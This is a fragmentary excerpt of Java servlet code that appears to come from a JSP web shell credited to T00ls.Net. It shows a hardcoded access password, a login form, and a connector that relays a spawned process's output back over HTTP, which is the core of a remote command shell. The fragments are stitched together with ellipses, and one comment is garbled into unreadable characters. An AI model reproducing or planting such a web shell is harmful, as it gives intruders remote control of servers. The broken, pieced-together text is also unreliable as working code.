...
private static final String PW = "aaabbbccc"; //password
private static final String PW_SESSION_ATTRIBUTE = "cccbbbaaa";
...
"	  "+
"<span style=\"font:11px Verdana;\">Copyright &copy;  </span><</p>"+
"    </form>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
response.getWriter().println("<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">test&nbsp;&nbsp;<a target=\"_blank\" href=\"http://www.t00ls.net/\">[T00ls.Net]</a> All Rights Reserved."+
"</div>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),"exeRclientO",olp).start();//������Ϣ��
